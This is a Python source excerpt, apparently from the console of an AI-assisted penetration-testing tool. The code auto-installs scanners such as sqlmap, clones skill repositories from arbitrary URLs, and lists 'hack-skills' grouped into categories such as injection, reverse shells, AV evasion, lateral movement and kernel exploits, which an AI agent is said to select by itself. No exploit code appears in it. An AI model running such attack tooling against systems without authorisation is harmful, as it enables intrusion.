                    f"[{THEME['success']}]✓[/]",
                    (info.version or self.s["tools_installed"])[:55],
                )
            else:
                table.add_row(
                    str(i), name, typ,
                    f"[{THEME['error']}]✗[/]",
                    info.install_hint[:55],
                )
        self.console.print(table)

        # ── 없는 도구가 있으면 자동 설치 제안 ──────────────────────
        if not missing_list:
            self.console.print(
                f"[{THEME['success']}]{self.s['tools_all_ok']}[/]\n"
            )
            return

        self.console.print(
            f"\n[{THEME['warn']}]{self.s['tools_missing'].format(n=len(missing_list))}[/]"
        )
        for i, (n, _) in enumerate(missing_list, 1):
            typ = _type_label.get(n, "tool")
            method = "GitHub Releases" if n in _GO_TOOLS else "brew/apt/pip"
            self.console.print(
                f"  [{THEME['secondary']}]{i}[/] — [{THEME['primary']}]{n}[/]"
                f"  [{THEME['dim']}]({typ}, {method})[/]"
            )
        self.console.print(
            f"\n  [{THEME['dim']}]{self.s['tools_install_hint']}[/]\n"
        )

        # 바로 설치할지 물어보기
        try:
            ans = self._session.prompt(
                HTML(f'<ansiyellow>{self.s["tools_install_all_ask"]} </ansiyellow>'),
                style=PT_STYLE,
            ).strip().lower()
        except (KeyboardInterrupt, EOFError):
            return

        if ans in ("y", "yes", "예", "是", "是的"):
            self.console.print(
                f"\n[{THEME['warn']}]{self.s['tools_install_start'].format(n=len(missing_list))}[/]\n"
            )
            for name, _ in missing_list:
                self._install_tool_interactive(name)
        else:
            self.console.print(
                f"[{THEME['dim']}]{self.s['tools_install_later']}[/]"
            )

    def _install_tool_interactive(self, tool_name: str) -> None:
        """단일 도구 자동 설치 with 진행 상황 출력"""
        from ..tools.registry import ToolRegistry, _find_binary
        from ..tools.executor import _GO_TOOLS, _PKG_TOOLS
        import shutil

        self.console.print(
            f"[{THEME['secondary']}]  ▸ {tool_name}[/] {self.s['install_trying']}",
            end=" "
        )
        log_lines: list[str] = []

        def log(msg: str) -> None:
            log_lines.append(msg)
            self.console.print(f"\n    [{THEME['dim']}]{msg}[/]", end="")

        success = False

        try:
            if tool_name in _GO_TOOLS:
                from ..tools.downloader import download_tool
                path = download_tool(tool_name, log)
                success = path is not None and path.exists()
            elif tool_name in _PKG_TOOLS:
                from ..tools.installer import install_tool
                success = install_tool(tool_name, log)
            elif tool_name in ("sqlmap", "wafw00f"):
                from ..tools.installer import install_tool
                success = install_tool(tool_name, log)
        except Exception as e:
            log(f"{self.s['install_error']}: {e}")

        if success:
            ToolRegistry._cache.pop(tool_name, None)
            self.console.print(f"\n  [{THEME['success']}]{self.s['tools_install_ok'].format(name=tool_name)}[/]")
        else:
            self.console.print(f"\n  [{THEME['error']}]{self.s['tools_install_fail'].format(name=tool_name)}[/]")

    def _cmd_skill_install(self, source: str) -> None:
        """
        스킬 설치:
          /skill install https://github.com/user/repo   → git clone
          /skill install /path/to/local/skill           → 로컬 폴더 복사
          /skill install <preset>                       → 내장 프리셋
        """
        import shutil, subprocess, tempfile
        from pathlib import Path

        skills_dir = Path(__file__).parent.parent / "skills" / "local_skills"
        skills_dir.mkdir(parents=True, exist_ok=True)

        self.console.print(f"\n[{THEME['warn']}]{self.s.get('skill_install_start', '📦 Installing skill: {source}').format(source=source)}[/]")

        # ── GitHub URL ────────────────────────────────────────────
        if source.startswith("http"):
            repo_name = source.rstrip("/").split("/")[-1].replace(".git", "")
            dst = skills_dir / repo_name
            if dst.exists():
                self.console.print(f"[{THEME['warn']}]  {self.s.get('skill_already_installed', 'Already installed: {name}').format(name=repo_name)}[/]")
                return
            with self.console.status(f"[{THEME['dim']}]git clone...[/]"):
                try:
                    result = subprocess.run(
                        ["git", "clone", "--depth=1", source, str(dst)],
                        capture_output=True, text=True, timeout=60
                    )
                    if result.returncode == 0:
                        self.console.print(f"[{THEME['success']}]  {self.s.get('skill_install_ok', '✔ {name} installed → {dst}').format(name=repo_name, dst=dst)}[/]")
                    else:
                        self.console.print(f"[{THEME['error']}]  {self.s.get('skill_clone_fail', 'git clone failed: {err}').format(err=result.stderr[:200])}[/]")
                        return
                except Exception as e:
                    self.console.print(f"[{THEME['error']}]  {self.s.get('skill_install_err', 'Error: {err}').format(err=e)}[/]")
                    return

        # ── 로컬 경로 ─────────────────────────────────────────────
        elif source.startswith("/") or source.startswith("~") or source.startswith("."):
            src_path = Path(source).expanduser().resolve()
            if not src_path.exists():
                self.console.print(f"[{THEME['error']}]  {self.s.get('skill_path_notfound', 'Path not found: {path}').format(path=src_path)}[/]")
                return
            dst = skills_dir / src_path.name
            if dst.exists():
                self.console.print(f"[{THEME['warn']}]  {self.s.get('skill_updating', 'Already installed: {name} — updating...').format(name=src_path.name)}[/]")
                shutil.rmtree(dst)
            shutil.copytree(str(src_path), str(dst))
            self.console.print(f"[{THEME['success']}]  {self.s.get('skill_install_ok_local', '✔ {name} installed').format(name=src_path.name)}[/]")

        else:
            self.console.print(f"[{THEME['error']}]  {self.s.get('skill_install_usage', 'Usage:')}[/]")
            self.console.print(f"[{THEME['dim']}]  /skill install https://github.com/user/skill-repo[/]")
            self.console.print(f"[{THEME['dim']}]  /skill install /path/to/local/skill[/]")
            return

        # 설치 후 스킬 목록 새로 표시
        from ..skills.engine import SkillEngine
        installed = SkillEngine().list_local_skills()
        self.console.print(f"\n[{THEME['success']}]{self.s.get('skill_installed_count', 'Installed skill packs: {n}').format(n=len(installed))}[/]")
        for sk in installed:
            self.console.print(f"  [{THEME['secondary']}]{sk['name']}[/] — {self.s.get('skill_ref_count', '{n} references').format(n=sk['ref_count'])}")

    def _list_hack_skills(self) -> list[dict]:
        """hack-skills 디렉토리 스캔 → 사용 가능한 스킬 목록 반환."""
        hs_dir = Path(__file__).parent.parent / "skills" / "hack-skills"
        skills = []
        if hs_dir.exists():
            for d in sorted(hs_dir.iterdir()):
                if d.is_dir() and (d / "SKILL.md").exists():
                    lines = len((d / "SKILL.md").read_text(encoding="utf-8").splitlines())
                    skills.append({"name": d.name, "lines": lines})
        return skills

    def _cmd_skill(self, keyword: str = "") -> None:
        from ..skills.engine import SkillEngine
        engine = SkillEngine()

        hack_skills = self._list_hack_skills()

        if keyword:
            # ── hack-skills 키워드 검색 ───────────────────────────────
            kw = keyword.lower()
            hs_matches = [s for s in hack_skills if kw in s["name"].lower()]
            if hs_matches:
                self.console.print(
                    f"\n[{THEME['success']}]⚡ {self.s.get('hackskills_match', 'hack-skills match ({n})').format(n=len(hs_matches))}[/]"
                )
                for s in hs_matches[:15]:
                    self.console.print(
                        f"  [{THEME['secondary']}]{s['name']}[/]  [{THEME['dim']}]{s['lines']} lines[/]"
                    )
                self.console.print(
                    f"\n  [{THEME['dim']}]{self.s.get('hackskills_auto_note', 'AI auto-selects. No manual install needed.')}[/]"
                )

            # ── 로컬 SecSkills references 검색 ────────────────────────
            local_results = engine.local_skill_search(keyword)
            if local_results:
                _ref_title = self.s.get("skill_secskills_ref", "SecSkills References")
                self.console.print(
                    f"\n[{THEME['secondary']}]🔍 {_ref_title}: [bold]{keyword}[/bold][/]"
                )
                ref_table = Table(border_style=THEME["primary"], show_header=True)
                ref_table.add_column(self.s.get("skill_col_pack", "Skill Pack"), style=THEME["secondary"], width=20)
                ref_table.add_column(self.s.get("skill_col_ref", "Reference"), style="white", width=30)
                ref_table.add_column(self.s.get("skill_col_tag", "Keywords"), style=THEME["dim"])
                for r in local_results[:8]:
                    ref_table.add_row(
                        r["skill_dir"],
                        r["reference"] or "SKILL.md",
                        ", ".join(r["matched_keywords"][:3]),
                    )
                self.console.print(ref_table)

            if not hs_matches and not local_results:
                # ── 내장 DB 검색 (마지막 수단) ─────────────────────────
                results = engine.search(keyword)
                if results:
                    for r in results[:8]:
                        self.console.print(f"  [{THEME['primary']}]{r['module']}[/] → {r['skill']}")
                else:
                    self.console.print(
                        f"[{THEME['dim']}]{self.s['skill_no_result'].format(kw=keyword)}[/]"
                    )
        else:
            # ── hack-skills 전체 목록 표시 ─────────────────────────────
            if hack_skills:
                hs_table = Table(
                    title=f"[{THEME['success']}]⚡ {self.s.get('hackskills_all_ready', 'hack-skills — {n} ready').format(n=len(hack_skills))}[/]",
                    border_style=THEME["success"],
                    show_header=True,
                )
                hs_table.add_column(self.s.get("skill_col_name", "Skill Name (SKILL_LOAD)"), style=THEME["secondary"], width=42)
                hs_table.add_column(self.s.get("skill_col_lines", "Lines"), justify="right", style=THEME["dim"], width=7)
                # 카테고리 구분선과 함께 출력
                cat_map = {
                    "injection": "🔴 Web Injection",
                    "sqli": "🔴 Web Injection",
                    "xss": "🔴 Web Injection",
                    "ssti": "🔴 Web Injection",
                    "cmdi": "🔴 Web Injection",
                    "nosql": "🔴 Web Injection",
                    "xxe": "🔴 Web Injection",
                    "expression": "🔴 Web Injection",
                    "jndi": "🔴 Web Injection",
                    "crlf": "🔴 Web Injection",
                    "xslt": "🔴 Web Injection",
                    "csv": "🔴 Web Injection",
                    "email": "🔴 Web Injection",
                    "http-parameter": "🔴 Web Injection",
                    "type-juggling": "🔴 Web Injection",
                    "ssrf": "🟠 Server-Side",
                    "deserializ": "🟠 Server-Side",
                    "request-smuggling": "🟠 Server-Side",
                    "http2": "🟠 Server-Side",
                    "http-host": "🟠 Server-Side",
                    "web-cache": "🟠 Server-Side",
                    "dns-rebin": "🟠 Server-Side",
                    "dangling": "🟠 Server-Side",
                    "arbitrary": "🟠 Server-Side",
                    "csrf": "🟡 Client-Side",
                    "cors": "🟡 Client-Side",
                    "clickjack": "🟡 Client-Side",
                    "open-redirect": "🟡 Client-Side",
                    "csp": "🟡 Client-Side",
                    "prototype": "🟡 Client-Side",
                    "authbypass": "🔵 Auth/Authz",
                    "idor": "🔵 Auth/Authz",
                    "jwt": "🔵 Auth/Authz",
                    "oauth": "🔵 Auth/Authz",
                    "saml": "🔵 Auth/Authz",
                    "401": "🔵 Auth/Authz",
                    "auth-sec": "🔵 Auth/Authz",
                    "upload": "🟣 File/Upload",
                    "path-traversal": "🟣 File/Upload",
                    "file-access": "🟣 File/Upload",
                    "insecure-source": "🟣 File/Upload",
                    "api": "⚪ API",
                    "graphql": "⚪ API",
                    "business": "⚫ Logic",
                    "race": "⚫ Logic",
                    "hack": "🌐 Recon",
                    "recon": "🌐 Recon",
                    "subdomain": "🌐 Recon",
                    "waf": "🌐 Recon",
                    "linux-priv": "🟤 PrivEsc",
                    "windows-priv": "🟤 PrivEsc",
                    "linux-security": "🟤 PrivEsc",
                    "linux-lateral": "🟤 PrivEsc",
                    "windows-av": "🟤 PrivEsc",
                    "windows-lateral": "🟤 PrivEsc",
                    "reverse-shell": "🟤 PrivEsc",
                    "tunneling": "🟤 PrivEsc",
                    "container": "🏗️ Infra",
                    "kubernetes": "🏗️ Infra",
                    "network-protocol": "🏗️ Infra",
                    "ntlm": "🏗️ Infra",
                    "unauthorized": "🏗️ Infra",
                    "active-directory": "🏛️ Active Directory",
                    "android": "📱 Mobile",
                    "ios": "📱 Mobile",
                    "mobile": "📱 Mobile",
                    "hash": "🔐 Crypto",
                    "rsa": "🔐 Crypto",
                    "classical": "🔐 Crypto",
                    "symmetric": "🔐 Crypto",
                    "lattice": "🔐 Crypto",
                    "binary": "💀 Binary/Exploit",
                    "format-string": "💀 Binary/Exploit",
                    "stack-overflow": "💀 Binary/Exploit",
                    "heap": "💀 Binary/Exploit",
                    "kernel": "💀 Binary/Exploit",
                    "browser-exploit": "💀 Binary/Exploit",
                    "sandbox": "💀 Binary/Exploit",
                    "anti-debug": "💀 Binary/Exploit",
                    "ghost": "🆕 Emerging",
                    "llm": "🆕 Emerging",
                    "ai-ml": "🆕 Emerging",
                    "defi": "🆕 Emerging",
                    "smart-contract": "🆕 Emerging",
                    "dependency": "🆕 Emerging",
                    "macos": "🆕 Emerging",
                }
                for s in hack_skills:
                    cat = "🔧 Other"
                    for prefix, c in cat_map.items():
                        if s["name"].lower().startswith(prefix) or prefix in s["name"].lower():
                            cat = c
                            break
                    hs_table.add_row(f"{s['name']}", str(s["lines"]))
                self.console.print(hs_table)
                self.console.print(
                    f"[{THEME['dim']}]  💡 {self.s.get('hackskills_auto_full', 'AI auto-selects. No manual install/activation needed.')}[/]"
                )
                _search_tip = {
                    "ko": "💡 /skill <키워드>  — 특정 스킬 검색",
                    "zh": "💡 /skill <关键词>  — 搜索特定技能",
                    "en": "💡 /skill <keyword>  — search for a specific skill",
                }.get(getattr(self.config, "lang", "en"), "💡 /skill <keyword>  — search for a specific skill")
                self.console.print(f"[{THEME['dim']}]  {_search_tip}[/]\n")

            # ── 로컬 SecSkills 팩 목록 ──────────────────────────────────
            local_skills = engine.list_local_skills()
            if local_skills:
                ls_table = Table(
                    title=f"[{THEME['primary']}]{self.s.get('skill_local_packs', '📦 SecSkills Local Reference Packs')}[/]",
                    border_style=THEME["primary"],
                )
                ls_table.add_column(self.s.get("skill_col_pack", "Skill Pack"), style=THEME["secondary"], width=22)
                ls_table.add_column(self.s.get("skill_col_refs", "Refs"), justify="right", width=10)
                ls_table.add_column(self.s.get("skill_col_main", "Main References"), style=THEME["dim"])
                for ls in local_skills:
                    refs_preview = ", ".join(ls["references"][:4])
                    if len(ls["references"]) > 4:
                        refs_preview += f" +{len(ls['references'])-4}..."
                    ls_table.add_row(ls["name"], str(ls["ref_count"]), refs_preview)
                self.console.print(ls_table)
                self.console.print(
                    f"[{THEME['dim']}]{self.s.get('skill_search_tip', '💡 Use /skill <keyword> to search references')}[/]\n"
                )

            # ── 내장 DB 모듈 목록 ──────────────────────────────────────
            table = Table(
                title=f"[{THEME['primary']}]{self.s['skill_module_title']}[/]",
                border_style=THEME["primary"],
            )
            _lang = getattr(self.config, "lang", "en")
            _col_module = {"ko": "모듈", "zh": "模块", "en": "Module"}.get(_lang, "Module")
            _col_count  = {"ko": "스킬 수", "zh": "技能数", "en": "Skills"}.get(_lang, "Skills")
            table.add_column("ID", style=THEME["secondary"], width=4)
            table.add_column(_col_module, style="white")
            table.add_column(_col_count, justify="right")
            for mod in engine.list_all():
                # 언어별 모듈명: ko > en > zh
                _mod_name = mod.get("ko") or mod.get("en") or mod.get("name", "")
                if _lang == "zh":
                    _mod_name = mod.get("name") or mod.get("en", "")
                elif _lang == "en":
                    _mod_name = mod.get("en") or mod.get("name", "")
                table.add_row(mod["id"], _mod_name, str(len(mod["skills"])))
            self.console.print(table)
            self.console.print(f"[{THEME['dim']}]{self.s['skill_search_hint']}[/]")

            # ── skills_data DB 모듈 목록 ───────────────────────────
            try:
                from ..skills.skills_data import SKILLS_DB
                from ..skills.skills_data2 import SKILLS_DB_2
                from ..skills.skills_data3 import SKILLS_DB_3
                _all_db = {**SKILLS_DB, **SKILLS_DB_2, **SKILLS_DB_3}
                from collections import Counter
                mod_counts: Counter = Counter()
                for sk in _all_db.values():
                    mod_counts[sk.get("module", "Unknown")] += 1
                _db_title = {
                    "ko": f"📚 내장 DB 모듈 — {len(_all_db)}개 스킬 (SKILL_LOAD: <모듈명>)",
                    "zh": f"📚 内置DB模块 — {len(_all_db)}个技能 (SKILL_LOAD: <模块名>)",
                    "en": f"📚 Built-in DB Modules — {len(_all_db)} skills (SKILL_LOAD: <module>)",
                }.get(_lang, f"📚 Built-in DB — {len(_all_db)} skills")
                _col_mod_name = {
                    "ko": "모듈명 (SKILL_LOAD)",
                    "zh": "模块名 (SKILL_LOAD)",
                    "en": "Module Name (SKILL_LOAD)",
                }.get(_lang, "Module Name (SKILL_LOAD)")
                _col_sk_cnt = {"ko": "스킬 수", "zh": "技能数", "en": "Skills"}.get(_lang, "Skills")
                db_table = Table(
                    title=f"[{THEME['primary']}]{_db_title}[/]",
                    border_style=THEME["primary"],
                )
                db_table.add_column(_col_mod_name, style=THEME["secondary"], width=32)
                db_table.add_column(_col_sk_cnt, justify="right", style=THEME["dim"], width=8)
                for mod_name, cnt in sorted(mod_counts.items()):
                    db_table.add_row(mod_name, str(cnt))
                self.console.print(db_table)
                self.console.print(
                    f"[{THEME['dim']}]  {self.s.get('skill_db_load_example', 'e.g. SKILL_LOAD: Exploitation')}[/]\n"
                )
            except Exception:
                pass

    # ── 유틸 ──────────────────────────────────────────────────────
    def _init_session(self) -> None:
        hist_path = Path.home() / ".config" / "bingo" / "history"
        hist_path.parent.mkdir(parents=True, exist_ok=True)
        self._session = PromptSession(
            history=FileHistory(str(hist_path)),
            auto_suggest=AutoSuggestFromHistory(),
            completer=_SlashCompleter(lambda: self.config.lang),
            complete_while_typing=True,
            mouse_support=False,
        )

    def _clear(self) -> None:
        os.system("cls" if os.name == "nt" else "clear")

    def _info(self, msg: str) -> None:
        self.console.print(f"[{THEME['dim']}]  ℹ  {msg}[/]")

    def _warn(self, msg: str) -> None:
        self.console.print(f"[{THEME['warn']}]  ⚠  {msg}[/]")

    def _error(self, msg: str) -> None:
        self.console.print(f"[{THEME['error']}]  ✖  {msg}[/]")

    def _success(self, msg: str) -> None:
        self.console.print(f"[{THEME['success']}]  ✔  {msg}[/]")
